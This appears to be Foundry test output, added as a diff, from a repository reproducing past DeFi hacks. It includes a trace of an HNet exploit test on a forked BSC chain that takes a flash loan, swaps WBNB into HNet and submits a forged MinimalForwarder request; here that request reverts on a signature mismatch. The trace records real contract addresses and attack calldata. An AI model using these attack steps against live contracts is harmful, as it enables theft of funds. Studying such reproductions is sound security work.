@@ -1,0 +1,169 @@
+Compiling 28 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.38s
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/interface.sol:886:5:
+    |
+886 |     function WETH() external view returns (address);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1598:5:
+     |
+1598 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1850:5:
+     |
+1850 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:2560:5:
+     |
+2560 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:3759:5:
+     |
+3759 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+  --> src/test/2023-12/HNet_exp.sol:44:5:
+   |
+44 |     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+    --> src/test/interface.sol:2080:1:
+     |
+2080 | interface WBNB {
+     | ^ (Relevant source part starts here and spans across multiple lines).
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 237.64ms (118.95µs CPU time)
+
+Ran 1 test for src/test/2023-12/HNet_exp.sol:ContractTest
+[FAIL. Reason: revert: MinimalForwarder: signature does not match request] testExploit() (gas: 242451)
+Logs:
+  Attacker WBNB balance before attack: 0
+
+Traces:
+  [5671] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 34141219 [3.414e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(HNet: [0x256D3BC542Ff4eDb5959b584Cc98741d28165BBc], "HNet")
+    │   └─ ← [Return] 
+    └─ ← [Stop] 
+
+  [242451] ContractTest::testExploit()
+    ├─ [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_uint(key: "Attacker WBNB balance before attack", val: 0)
+    ├─ [29649] HNet::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ [26971] 0xaE5be6d490C47c7417e91B7911d3A0Ce3553438d::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [24420] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [165191] 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476::flashLoan(100000000000000000 [1e17], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
+    │   ├─ [162478] 0x85351262f7474Ebe23FfAcD633cf20A491F1325D::flashLoan(100000000000000000 [1e17], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00) [delegatecall]
+    │   │   ├─ [27962] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000000 [1e17])
+    │   │   │   ├─ emit Transfer(from: 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 100000000000000000 [1e17])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [124568] ContractTest::DPPFlashLoanCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000000 [1e17], 0, 0x00)
+    │   │   │   ├─ [98446] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(100000000000000000 [1e17], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x256D3BC542Ff4eDb5959b584Cc98741d28165BBc], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1701938250 [1.701e9])
+    │   │   │   │   ├─ [8225] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x7E3F53Af12B2C84c35700BE68Cd316518546ca34, 100000000000000000 [1e17])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x7E3F53Af12B2C84c35700BE68Cd316518546ca34, value: 100000000000000000 [1e17])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [3184] HNet::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   ├─ [3012] 0xaE5be6d490C47c7417e91B7911d3A0Ce3553438d::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [2893] 0x7E3F53Af12B2C84c35700BE68Cd316518546ca34::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 18736511838322005599804185415689 [1.873e31], 4284670302101102912 [4.284e18], 1701896521 [1.701e9]
+    │   │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x7E3F53Af12B2C84c35700BE68Cd316518546ca34) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4384670302101102912 [4.384e18]
+    │   │   │   │   ├─ [72734] 0x7E3F53Af12B2C84c35700BE68Cd316518546ca34::swap(426274610346314935516141063331 [4.262e29], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   ├─ [37704] HNet::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 426274610346314935516141063331 [4.262e29])
+    │   │   │   │   │   │   ├─ [37526] 0xaE5be6d490C47c7417e91B7911d3A0Ce3553438d::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 426274610346314935516141063331 [4.262e29]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x7E3F53Af12B2C84c35700BE68Cd316518546ca34, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 426274610346314935516141063331 [4.262e29])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [1184] HNet::balanceOf(0x7E3F53Af12B2C84c35700BE68Cd316518546ca34) [staticcall]
+    │   │   │   │   │   │   ├─ [1012] 0xaE5be6d490C47c7417e91B7911d3A0Ce3553438d::balanceOf(0x7E3F53Af12B2C84c35700BE68Cd316518546ca34) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 18310237227975690664288044352358 [1.831e31]
+    │   │   │   │   │   │   └─ ← [Return] 18310237227975690664288044352358 [1.831e31]
+    │   │   │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x7E3F53Af12B2C84c35700BE68Cd316518546ca34) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4384670302101102912 [4.384e18]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 18310237227975690664288044352358 [1.831e31], reserve1: 4384670302101102912 [4.384e18])
+    │   │   │   │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 0, amount1In: 100000000000000000 [1e17], amount0Out: 426274610346314935516141063331 [4.262e29], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [1184] HNet::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   ├─ [1012] 0xaE5be6d490C47c7417e91B7911d3A0Ce3553438d::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 426274610346314935516141063331 [4.262e29]
+    │   │   │   │   │   └─ ← [Return] 426274610346314935516141063331 [4.262e29]
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [2472] 0x7C4717039B89d5859c4Fbb85EDB19A6E2ce61171::getNonce(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [6534] 0x7C4717039B89d5859c4Fbb85EDB19A6E2ce61171::execute(ForwardRequest({ from: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, to: 0x256D3BC542Ff4eDb5959b584Cc98741d28165BBc, value: 0, gas: 5000000 [5e6], nonce: 0, data: 0xac9650d8000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003842966c6800000000000000000000000000000000000000000001a129e9fb3cab2b4000007e3f53af12b2c84c35700be68cd316518546ca340000000000000000 }), 0xc065407074ef2e05acdd73a1b1c96c6fa4215c8298f1b78b549d6849e3d84e475decf131b7477236ea72bb15dfb89ea226dff05cd173063e34fe9aea54e667f71b)
+    │   │   │   │   ├─ [3000] PRECOMPILES::ecrecover(0x5189a711d8b2e3900da1ca233dc14e648e416b86506becaee957d1abe046fd9d, 27, 87022963225124603387546963525681256627730064999442009043756495626032668757575, 42483735486739976653642534964154399752236960323873001059654502089694994917367) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000007e4b5387faee0cbd7a5eb090000ed53788070773
+    │   │   │   │   └─ ← [Revert] revert: MinimalForwarder: signature does not match request
+    │   │   │   └─ ← [Revert] revert: MinimalForwarder: signature does not match request
+    │   │   └─ ← [Revert] revert: MinimalForwarder: signature does not match request
+    │   └─ ← [Revert] revert: MinimalForwarder: signature does not match request
+    └─ ← [Revert] revert: MinimalForwarder: signature does not match request
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 327.30ms (1.59ms CPU time)
+
+Ran 2 test suites in 329.51ms (564.93ms CPU time): 1 tests passed, 1 failed, 0 skipped (2 total tests)
+
+Failing tests:
+Encountered 1 failing test in src/test/2023-12/HNet_exp.sol:ContractTest
+[FAIL. Reason: revert: MinimalForwarder: signature does not match request] testExploit() (gas: 242451)
+
+Encountered a total of 1 failing tests, 1 tests succeeded
